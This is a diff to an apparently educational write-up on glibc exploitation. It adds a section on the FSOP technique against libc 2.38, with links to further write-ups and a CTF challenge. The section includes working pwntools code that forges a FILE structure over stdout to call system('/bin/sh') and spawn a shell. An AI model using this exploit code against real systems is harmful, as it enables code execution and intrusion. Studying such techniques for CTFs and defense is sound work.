@@ -318,6 +318,46 @@ you can find full exemple in file:  `exp_dt_fini.py`  (I leaved various debuggin
 
 ### 3 - the FSOP way, targetting stdout
 
+well...believe it , or believe it not (magnifique franglais)
 
+were are in 2023, and FSOP still works great for code execution by writing in libc. 🤷
 
-(in progress)
+There are still many different paths to achieve it, and this article is supposed to summarize, not to be exhaustive,
+
+so I will just give a clean, simple example for getting a code execution with just a libc leak on `libc 2.38` of course.
+
+If you want to explore in details the FSOP way, use the force, and explore these wonderful write-ups on the subject by **Roderick** (in chinese, use google translate), **Kylebot**, and **Nifitic**.. when you will have digest them..you will know a lot more about FSOP !
+
++ [Roderick Chan - house of apple 1](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/)
++ [Roderick Chan - house of apple 2](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/)
++ [Roderick Chan - house of apple 3](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/)
++ [Kyle bot - angry-FSOP - using angr to explore FSOP path](https://blog.kylebot.net/2022/10/22/angry-FSROP/)  
++ [Nifitic - Deep dive into FSOP](https://niftic.ca/posts/fsop/)
+
+so, here is a simple example how to construct the fake FILE structure, the full exploit is in file: `exp_fsop.py`,  I have leaved debugging options in it , if you want to explore by yourself:
+
+```python
+# some constants
+stdout_lock = libc.address + 0x2008f0   # _IO_stdfile_1_lock  (symbol not exported)
+stdout = libc.sym['_IO_2_1_stdout_']
+fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
+# our gadget
+gadget = libc.address + 0x00000000001676a0 # add rdi, 0x10 ; jmp rcx
+
+fake = FileStructure(0)
+fake.flags = 0x3b01010101010101
+fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
+fake._IO_save_base = gadget
+fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
+fake._lock=stdout_lock
+fake._codecvt= stdout + 0xb8
+fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
+fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
+# write the fake Filestructure to stdout
+write(libc.sym['_IO_2_1_stdout_'], bytes(fake))
+# enjoy your shell
+```
+
+I used a simple gadget that increase `rdi` register and jump to `rcx` which contains system.
+
+this is the same path via `_IO_wfile_underflow` that we used in `byor`challenge from **Hack.lu** 2022 edition, which is described here --> [https://github.com/nobodyisnobody/write-ups/tree/main/Hack.lu.CTF.2022/pwn/byor](https://github.com/nobodyisnobody/write-ups/tree/main/Hack.lu.CTF.2022/pwn/byor)
